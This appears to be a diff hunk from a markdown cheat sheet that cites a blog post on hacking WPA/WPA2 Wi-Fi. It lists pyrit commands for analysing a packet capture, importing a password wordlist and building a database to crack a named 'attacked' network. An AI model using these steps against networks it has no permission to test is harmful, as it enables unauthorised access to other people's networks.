@@ -17,6 +17,6 @@ http://lewiscomputerhowto.blogspot.com/2014/06/how-to-hack-wpawpa2-wi-fi-with-ka
 ### pyrit
 * pyrit -r mon0-01.cap analyze
 * pyrit -u sqlite:///mydb.db -i wordlist.txt import_passwords
-* pyrit -u sqlite:///mydb.db -e mon0 create_essid
+* pyrit -u sqlite:///mydb.db -e {attacked_network_name} create_essid
 * #pyrit eval
 * pyrit -u sqlite:///mydb.db batch
